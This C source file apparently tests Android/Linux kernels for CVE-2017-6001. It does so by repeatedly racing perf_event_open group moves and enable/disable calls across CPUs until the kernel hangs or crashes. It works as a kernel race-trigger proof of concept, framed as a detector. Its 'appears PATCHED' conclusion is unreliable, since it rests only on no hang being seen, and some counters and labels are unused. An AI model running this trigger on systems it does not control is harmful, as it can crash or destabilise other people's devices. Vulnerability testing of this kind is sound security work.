/*
 * CVE-2017-6001 move_group Race Detector
 * 
 * The vulnerability is in perf_event_open when moving an event between groups.
 * When an event is created with a group_fd pointing to an event on a different CPU,
 * the kernel needs to move the group. The move_group path has a TOCTOU race:
 *   1. ctx->is_active check happens without holding ctx->lock
 *   2. Between check and actual move, the context could become active
 *   3. This leads to list corruption in the event group lists
 *
 * Detection strategy:
 *   - Thread A: Creates event groups on CPU 0, then opens new events with 
 *     group_fd pointing to CPU 1 events (triggers move_group)
 *   - Thread B: Continuously enables/disables events on CPU 0 (changes ctx->is_active)
 *   - Thread C: Health monitor watching for hangs/crashes
 *
 * If the kernel hangs, crashes, or produces anomalous behavior, the race exists.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sched.h>
#include <time.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 364
#endif

static long perf_event_open(struct perf_event_attr *attr, pid_t pid,
                            int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static volatile int stop_flag = 0;
static volatile int hang_detected = 0;
static volatile int anomaly_count = 0;
static volatile int total_iterations = 0;
static volatile int move_group_attempts = 0;
static volatile int move_group_success = 0;

static void pin_to_cpu(int cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

/* Create a basic software event on a specific CPU */
static int create_event(int cpu, int group_fd) {
    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size = sizeof(attr);
    attr.type = PERF_TYPE_SOFTWARE;
    attr.config = PERF_COUNT_SW_CPU_CLOCK;
    attr.disabled = 1;
    attr.exclude_kernel = 1;
    attr.exclude_hv = 1;
    
    return perf_event_open(&attr, 0, cpu, group_fd, 0);
}

/* Thread: Continuously enable/disable events to change ctx->is_active */
static void *toggle_thread(void *arg) {
    int *fds = (int *)arg;
    pin_to_cpu(0);
    
    while (!stop_flag) {
        for (int i = 0; i < 4 && fds[i] >= 0; i++) {
            ioctl(fds[i], PERF_EVENT_IOC_ENABLE, 0);
        }
        /* Tight timing — no sleep here to maximize race window */
        for (int i = 0; i < 4 && fds[i] >= 0; i++) {
            ioctl(fds[i], PERF_EVENT_IOC_DISABLE, 0);
        }
    }
    return NULL;
}

/* Thread: Health monitor */
static void *health_thread(void *arg) {
    int last_total = 0;
    int stall_count = 0;
    
    while (!stop_flag) {
        sleep(2);
        int current = total_iterations;
        if (current == last_total && current > 0) {
            stall_count++;
            if (stall_count >= 3) {
                printf("\n!!! HANG DETECTED !!! Iterations stalled at %d\n", current);
                hang_detected = 1;
                stop_flag = 1;
                break;
            }
        } else {
            stall_count = 0;
        }
        last_total = current;
    }
    return NULL;
}

/* Phase 1: Move group race — create group on CPU 0, then add event from CPU 1 */
static void race_move_group(int iterations) {
    printf("\n=== Phase 1: move_group race (CPU 0→1) ===\n");
    printf("Iterations: %d\n", iterations);
    
    int toggle_fds[4] = {-1, -1, -1, -1};
    
    /* Create persistent toggle events on CPU 0 */
    for (int i = 0; i < 4; i++) {
        toggle_fds[i] = create_event(0, -1);
        if (toggle_fds[i] < 0) {
            printf("Failed to create toggle event %d: %s\n", i, strerror(errno));
            /* Clean up */
            for (int j = 0; j < i; j++) close(toggle_fds[j]);
            return;
        }
    }
    
    /* Start toggle thread */
    pthread_t toggler, monitor;
    pthread_create(&toggler, NULL, toggle_thread, toggle_fds);
    pthread_create(&monitor, NULL, health_thread, NULL);
    
    for (int i = 0; i < iterations && !stop_flag; i++) {
        /* Create group leader on CPU 0 */
        int leader = create_event(0, -1);
        if (leader < 0) {
            if (errno == EMFILE) {
                usleep(1000);
                continue;
            }
            continue;
        }
        
        /* Enable the leader to make ctx active */
        ioctl(leader, PERF_EVENT_IOC_ENABLE, 0);
        
        /* Now try to create a child event on CPU 1 with group_fd pointing to CPU 0 leader
         * This triggers move_group in the kernel */
        move_group_attempts++;
        int child = create_event(1, leader);
        
        if (child >= 0) {
            move_group_success++;
            /* Success! The kernel moved the group. Race window was here. */
            close(child);
        }
        /* errno == EXDEV means different CPU rejected (kernel may check) */
        /* errno == EINVAL also possible */
        
        close(leader);
        total_iterations++;
        
        if (i % 500 == 0) {
            printf("\r  Iteration %d/%d, moves: %d/%d, anomalies: %d",
                   i, iterations, move_group_success, move_group_attempts, anomaly_count);
            fflush(stdout);
        }
    }
    
    stop_flag = 1;
    pthread_join(toggler, NULL);
    pthread_join(monitor, NULL);
    
    for (int i = 0; i < 4; i++) {
        if (toggle_fds[i] >= 0) close(toggle_fds[i]);
    }
    
    printf("\n  Total: %d iterations, moves: %d/%d, anomalies: %d, hang: %s\n",
           total_iterations, move_group_success, move_group_attempts,
           anomaly_count, hang_detected ? "YES" : "no");
}

/* Phase 2: Concurrent group creation/destruction */
static volatile int phase2_running = 0;

static void *create_destroy_thread(void *arg) {
    int cpu = *(int *)arg;
    pin_to_cpu(cpu);
    
    while (phase2_running) {
        int fds[8];
        int count = 0;
        
        /* Create a group leader */
        fds[0] = create_event(cpu, -1);
        if (fds[0] < 0) { usleep(100); continue; }
        count = 1;
        
        /* Add children */
        for (int i = 1; i < 8; i++) {
            fds[i] = create_event(cpu, fds[0]);
            if (fds[i] < 0) break;
            count++;
        }
        
        /* Enable all */
        for (int i = 0; i < count; i++)
            ioctl(fds[i], PERF_EVENT_IOC_ENABLE, 0);
        
        /* Disable and close in various orders to stress-test */
        if (total_iterations & 1) {
            /* Forward close */
            for (int i = 0; i < count; i++) close(fds[i]);
        } else {
            /* Reverse close */
            for (int i = count - 1; i >= 0; i--) close(fds[i]);
        }
        
        __sync_fetch_and_add(&total_iterations, 1);
    }
    return NULL;
}

static void race_concurrent_groups(int iterations) {
    printf("\n=== Phase 2: Concurrent group create/destroy ===\n");
    printf("Iterations: %d (4 threads, 2 CPUs)\n", iterations);
    
    total_iterations = 0;
    stop_flag = 0;
    phase2_running = 1;
    
    pthread_t threads[4], monitor;
    int cpus[4] = {0, 0, 1, 1};
    
    pthread_create(&monitor, NULL, health_thread, NULL);
    for (int i = 0; i < 4; i++)
        pthread_create(&threads[i], NULL, create_destroy_thread, &cpus[i]);
    
    /* Run for a time limit or iteration count */
    while (total_iterations < iterations && !stop_flag) {
        usleep(100000);
        printf("\r  Progress: %d/%d iterations, anomalies: %d",
               total_iterations, iterations, anomaly_count);
        fflush(stdout);
    }
    
    phase2_running = 0;
    stop_flag = 1;
    
    for (int i = 0; i < 4; i++)
        pthread_join(threads[i], NULL);
    pthread_join(monitor, NULL);
    
    printf("\n  Total: %d iterations, anomalies: %d, hang: %s\n",
           total_iterations, anomaly_count, hang_detected ? "YES" : "no");
}

/* Phase 3: perf_event_open with PERF_FLAG_PID_CGROUP race */
static void race_pid_cgroup(int iterations) {
    printf("\n=== Phase 3: Group fd + different task race ===\n");
    
    total_iterations = 0;
    stop_flag = 0;
    
    pthread_t monitor;
    pthread_create(&monitor, NULL, health_thread, NULL);
    
    for (int i = 0; i < iterations && !stop_flag; i++) {
        /* Create leader monitoring self on CPU 0 */
        int leader = create_event(0, -1);
        if (leader < 0) continue;
        
        ioctl(leader, PERF_EVENT_IOC_ENABLE, 0);
        
        /* Try to add child monitoring PID 1 (init) to the group */
        struct perf_event_attr attr;
        memset(&attr, 0, sizeof(attr));
        attr.size = sizeof(attr);
        attr.type = PERF_TYPE_SOFTWARE;
        attr.config = PERF_COUNT_SW_CPU_CLOCK;
        attr.disabled = 1;
        attr.exclude_kernel = 1;
        
        int child = perf_event_open(&attr, 1, -1, leader, 0);
        if (child >= 0) {
            move_group_success++;
            close(child);
        }
        
        close(leader);
        total_iterations++;
        
        if (i % 500 == 0) {
            printf("\r  Iteration %d/%d, cross-task: %d",
                   i, iterations, move_group_success);
            fflush(stdout);
        }
    }
    
    stop_flag = 1;
    pthread_join(monitor, NULL);
    
    printf("\n  Total: %d iterations, cross-task success: %d, hang: %s\n",
           total_iterations, move_group_success, hang_detected ? "YES" : "no");
}

int main(int argc, char **argv) {
    int phase1_iters = 3000;
    int phase2_iters = 5000;
    int phase3_iters = 2000;
    
    if (argc > 1) phase1_iters = atoi(argv[1]);
    if (argc > 2) phase2_iters = atoi(argv[2]);
    if (argc > 3) phase3_iters = atoi(argv[3]);
    
    printf("CVE-2017-6001 move_group Race Detector\n");
    printf("======================================\n");
    
    /* Ensure perf_harden is off */
    char buf[64];
    FILE *f = popen("getprop security.perf_harden", "r");
    if (f) {
        if (fgets(buf, sizeof(buf), f)) {
            buf[strcspn(buf, "\n")] = 0;
            printf("security.perf_harden = %s\n", buf);
            if (strcmp(buf, "0") != 0) {
                printf("ERROR: Set security.perf_harden=0 first!\n");
                pclose(f);
                return 1;
            }
        }
        pclose(f);
    }
    
    /* Check CPU count */
    int ncpus = sysconf(_SC_NPROCESSORS_ONLN);
    printf("CPUs online: %d\n", ncpus);
    if (ncpus < 2) {
        printf("WARNING: Need 2+ CPUs for cross-CPU race. Continuing anyway.\n");
    }
    
    /* Phase 1: move_group race (most likely to trigger) */
    race_move_group(phase1_iters);
    
    /* Reset counters */
    total_iterations = 0;
    stop_flag = 0;
    hang_detected = 0;
    move_group_success = 0;
    move_group_attempts = 0;
    
    /* Phase 2: Concurrent group operations */
    race_concurrent_groups(phase2_iters);
    
    /* Reset */
    total_iterations = 0;
    stop_flag = 0;
    hang_detected = 0;
    move_group_success = 0;
    
    /* Phase 3: Cross-task group race */
    race_pid_cgroup(phase3_iters);
    
    printf("\n=== SUMMARY ===\n");
    printf("All phases complete.\n");
    if (hang_detected) {
        printf("*** HANG DETECTED — CVE-2017-6001 MAY BE PRESENT ***\n");
    } else {
        printf("No hangs or crashes detected.\n");
        printf("CVE-2017-6001 appears PATCHED on this kernel.\n");
    }
    
    return 0;
}
